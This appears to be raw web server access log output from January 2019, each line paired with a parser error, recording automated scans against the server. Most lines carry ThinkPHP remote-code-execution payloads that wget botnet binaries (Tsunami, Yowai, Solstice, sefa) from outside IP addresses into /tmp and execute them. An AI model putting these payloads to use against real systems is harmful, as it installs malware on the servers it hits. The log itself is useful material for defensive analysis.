('103.36.79.7 - - [24/Jan/2019:01:53:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.115.193.34 - - [24/Jan/2019:01:58:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.13.243.49 - - [24/Jan/2019:02:59:31 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('77.22.111.96 - - [24/Jan/2019:03:40:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('98.1.80.42 - - [24/Jan/2019:03:57:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('86.229.20.79 - - [24/Jan/2019:04:10:34 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('58.187.64.58 - - [24/Jan/2019:04:13:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('68.183.90.135 - - [24/Jan/2019:06:01:31 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://108.61.86.94/bins/Solstice.x86 -O /tmp/.Solstice; chmod 777 /tmp/.Solstice; /tmp/.Solstice Solstice.x86\' HTTP/1.1" 400 166 "-" "Solstice/2.0" "-"\n', 'list index out of range')
('64.68.229.6 - - [24/Jan/2019:06:07:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('123.120.173.71 - - [24/Jan/2019:06:48:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('34.221.219.207 - - [24/Jan/2019:06:57:45 +0330] "t3 9.2.0.0" 400 166 "-" "-" "-"\n', 'list index out of range')
('221.202.76.248 - - [24/Jan/2019:06:57:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('183.80.89.73 - - [24/Jan/2019:07:22:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.112.104.192 - - [24/Jan/2019:07:37:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('179.95.230.55 - - [24/Jan/2019:07:37:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('183.80.89.8 - - [24/Jan/2019:07:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('80.230.194.29 - - [24/Jan/2019:08:22:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.90.163.13 - - [24/Jan/2019:08:46:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('197.35.81.102 - - [24/Jan/2019:09:59:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('74.82.4.78 - - [24/Jan/2019:10:36:55 +0330] " r4---sn-a5msen7s.googlevideo.com.com\\x01\\xBB\\x0Ch\\xBFy\\xE3K.\\xB1\\x14\\x0B\\xBD\\xC2TS\\x91\\xDC\\x0FKh\\x9E\\xF6\\xC5];\\x88\\x0F\\x13\\xBD\\xC5\\xD6\\xF2\\xAE\\x14\\xC5Ks\\xA9\\xFE<5\\xC2\\x005\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.4.78 - - [24/Jan/2019:10:41:34 +0330] "\\x10\\x7F\\x91Q\\xE3\\x8E\\x5C\\xE7\\xF4>\\xB3&{o\\xB9F/~P\\xD3B?\\x91\\xA9\\xD2\\x86\\xF7fB\\xB4FE\\xF9\\xE4U\\x1B`\\x1F\\x16\\xB4)" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.87.84 - - [24/Jan/2019:10:51:17 +0330] "\\x04\\xB7\\x14(\\x8D\\x17\\xC7fR\\x95\\xE9.R\\xAF62\\xBD7\\x19\\x89\\xD3\\x02\\xA4\\xFD\\x9D^F\\xD0\\xD2P\\xEFF\\x89\\xBE\\xCA\\xE6\\xD2\\x9E%,\\x09\\xE2\\x02x\\xB2\\xFF\\xFA\\x92`\\xBA\\x16\\x93\\x80\\x04\\xC4D\\xD4\\xE1\\x8Cz\\xE0\\x06\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('52.53.248.70 - - [24/Jan/2019:11:26:18 +0330] "t3 9.2.0.0" 400 166 "-" "-" "-"\n', 'list index out of range')
('193.250.60.181 - - [24/Jan/2019:11:43:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('43.230.197.4 - - [24/Jan/2019:12:27:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('180.145.23.14 - - [24/Jan/2019:12:43:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.71.174.32 - - [24/Jan/2019:12:43:55 +0330] "E\\x00\\x003\\xAA1@\\x00@\\x11\\xA6N" 400 166 "-" "-" "-"\n', 'list index out of range')
('64.71.174.32 - - [24/Jan/2019:12:43:59 +0330] "\\x17\\x03\\x03\\x01\\xBB\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1F\\x8A\\x03\\x9F" 400 166 "-" "-" "-"\n', 'list index out of range')
('114.243.174.202 - - [24/Jan/2019:12:53:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.78.190.233 - - [24/Jan/2019:13:08:04 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:31183},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[70942,%2070943,%2070944,%2074910,%2074911]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[61071,%2061072]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1132261,%201141394,%201152740,%201157399,%201162757,%201162784,%201163433,%201163458,%201163491,%201164137,%201164170,%201164204,%201170585,%201180757,%201186324,%201192491,%201202677,%201206088,%201211683,%201216347,%201221815,%201226823,%201232111,%201236848,%201242299,%201248494,%201255362,%201269844,%201273095,%201273594,%201274911,%201277429,%201281160,%201287133,%201288507,%201292448,%201293149,%201299401,%201305868,%201314183,%201318413,%201321856,%201325306,%201336507,%201336569,%201340015,%201340124,%201355331,%201355503,%201358951,%201359376,%201360159,%201360331,%201373561,%201373691,%201373817,%201374201,%201374449,%201380272,%201381864,%201389293,%201391526,%201401342,%201408709,%201423222,%201424109,%201424676,%201425244,%201425736,%201426169,%201427981,%201428236,%201428896,%201429330,%201431149,%201431284,%201438343,%201452686,%201453110,%201457728,%201457895,%201458328,%201478609,%201509796,%201512143,%201515917,%201531810,%201541818,%201550826,%201551263,%201552038,%201552587,%201552739,%201566551,%201567457,%201578138,%201592324,%201610621,%201612148,%201615507,%201619961,%201633984,%201653517,%201658611,%201663093,%201680244,%201680543,%201682265,%201688401,%201707645,%201713624,%201763702,%201780392,%201786397,%201793270,%201799553,%201812188,%201816983,%201831091,%201835974,%201842523,%201848262,%201851552,%201851798,%201856474,%201856808,%201863025,%201863122,%201863336,%201864696,%201867681,%201870627,%201870822,%201871155,%201871156,%201872607,%201872680,%201872795,%201872869,%201872942,%201874056,%201874129,%201874202,%201874275,%201874349,%201874422,%201874495,%201874569,%201874642,%201874716,%201874790,%201874863,%201874936,%201875010,%201875083,%201875157,%201875230,%201875304,%201875377,%201875451,%201875525,%201875599,%201875672,%201875748,%201875821,%201875895,%201880033,%201880129,%201881117,%201882126,%201882683,%201882722,%201883435,%201886044,%201892636,%201892756,%201893850,%201893890,%201894641,%201895043,%201896810,%201896952,%201897555,%201900039,%201903599,%201903797,%201904548,%201904699,%201905114,%201905289,%201905958,%201906256,%201906687,%201907485,%201907735,%201907768,%201907801,%201907840,%201910752,%201917185,%201920194,%201920818,%201931132,%201939261,%201942350,%201942436,%201949430,%201949860,%201950288,%201954610,%201958097,%201958273,%201964583,%201966833,%201972840,%201977314,%201132262,%201141395,%201152741,%201157400,%201162759,%201162785,%201163436,%201163459,%201163492,%201164138,%201164171,%201164205,%201170586,%201180758,%201186325,%201202678,%201206089,%201211684,%201211921,%201213138,%201216348,%201216924,%201216980,%201217047,%201217092,%201219005,%201219186,%201219197,%201219252,%201219365,%201219942,%201221816,%201226824,%201232112,%201236849,%201242300,%201248495,%201255363,%201269845,%201273096,%201273595,%201274912,%201277430,%201281161,%201287134,%201288508,%201292449,%201293150,%201299402,%201305869,%201314184,%201318414,%201325307,%201336508,%201336570,%201340016,%201340125,%201355332,%201355504,%201358952,%201359377,%201360161,%201360333,%201373563,%201373693,%201373819,%201374203,%201374451,%201380274,%201381866,%201389295,%201391528,%201401344,%201408711,%201423224,%201424111,%201424678,%201425246,%201425738,%201426171,%201427983,%201428238,%201428898,%201429332,%201452688,%201453112,%201457730,%201457897,%201458330,%201478611,%201509798,%201512145,%201515919,%201531812,%201541820,%201550828,%201551265,%201552040,%201552591,%201552745,%201566553,%201578140,%201592326,%201610623,%201612150,%201615509,%201619963,%201634010,%201653519,%201658613,%201663095,%201680246,%201680545,%201682267,%201688405,%201707649,%201713626,%201763704,%201780394,%201786401,%201793272,%201799555,%201812190,%201816985,%201831093,%201835976,%201842525,%201848264,%201863027,%201863124,%201863338,%201864698,%201867683,%201870629,%201870824,%201871157,%201871158,%201872609,%201872682,%201872797,%201872871,%201872944,%201874058,%201874131,%201874204,%201874277,%201874351,%201874424,%201874497,%201874571,%201874644,%201874718,%201874792,%201874865,%201874938,%201875012,%201875085,%201875159,%201875232,%201875306,%201875379,%201875453,%201875527,%201875601,%201875674,%201875750,%201875823,%201875897,%201880035,%201880131,%201881119,%201882128,%201882685,%201882724,%201883437,%201886046,%201892640,%201892760,%201893854,%201893892,%201894643,%201895045,%201896812,%201896954,%201903601,%201903799,%201904550,%201904701,%201905116,%201905291,%201905960,%201906258,%201906689,%201907487,%201907737,%201907803,%201907842,%201910754,%201917187,%201920196,%201920820,%201922679,%201922836,%201922837,%201923017,%201928721,%201931134,%201933483,%201934330,%201935090,%201935211,%201940737,%201940855,%201942354,%201942438,%201949432,%201949862,%201950290,%201954612,%201958099,%201958275,%201964585,%201966835,%201972842,%201977316,%201978694,%201978772]}]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:%27neProperty%27,%20field:%27oldValue%27,%20val:%27newValue%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:%27isNull%27,%20field:%27oldValue%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27isNotNull%27,%20field:%27newValue%27}]}]}]}]&columns=[{%27name%27:%27actor%27},{%27name%27:%27className%27},{%27name%27:%27persistedObjectId%27},{%27name%27:%27eventName%27},{%27name%27:%27propertyName%27},{%27name%27:%27oldVa" 414 186 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:13:25:44 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CH\\x9D\\xB6>\\xA93\\x9C \\x9F\\x80\\xDF\\xD1\\xB9\\xF1\\x7F\\xDC\\xEC\\xF0\\xFD\\xD2C\\x90\\xCE\\x1E\\x93\\x02J\\xD0o\\xBAI\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:13:25:44 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CH\\x9D\\xB6\\xA6\\xCDg\\x80\\xC8[=\\xE6\\xCA\\xD8\\x16\\xAE\\xA4P\\xA3j\\xB5\\xDC\\xE9Pl\\xBD\\xB6+\\x96n\\x8Du\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('3.83.247.150 - - [24/Jan/2019:13:50:35 +0330] "GET /?utm_source=2&utm_medium=21&utm_campaign=Z&utm_term=202&utm_content=2003" 200 65536 "-" "-" "-"\n', 'list index out of range')
('188.210.165.90 - - [24/Jan/2019:14:06:56 +0330] "G" 400 0 "-" "-" "-"\n', 'list index out of range')
('89.35.146.67 - - [24/Jan/2019:15:04:01 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('68.70.213.56 - - [24/Jan/2019:15:10:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('186.147.251.21 - - [24/Jan/2019:15:30:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('92.87.16.123 - - [24/Jan/2019:15:32:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.71.126 - - [24/Jan/2019:15:56:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.70.250.38 - - [24/Jan/2019:15:58:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('208.85.211.218 - - [24/Jan/2019:16:06:52 +0330] "x" 400 166 "-" "-" "-"\n', 'list index out of range')
('123.120.173.71 - - [24/Jan/2019:16:14:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('189.59.96.224 - - [24/Jan/2019:16:17:59 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [24/Jan/2019:19:02:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.105.7.73 - - [24/Jan/2019:19:57:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.117.152.36 - - [24/Jan/2019:21:22:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('158.69.237.205 - - [24/Jan/2019:21:55:08 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('158.69.237.205 - - [24/Jan/2019:21:55:23 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('194.113.106.125 - - [24/Jan/2019:22:23:43 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('121.84.86.234 - - [24/Jan/2019:22:41:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('58.135.224.45 - - [24/Jan/2019:22:53:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [24/Jan/2019:23:58:01 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('113.22.59.250 - - [25/Jan/2019:00:54:03 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('46.243.179.232 - - [25/Jan/2019:01:00:35 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('112.28.77.213 - - [25/Jan/2019:01:36:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('118.68.205.254 - - [25/Jan/2019:01:54:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('36.106.21.29 - - [25/Jan/2019:02:21:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86\' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"\n', 'list index out of range')
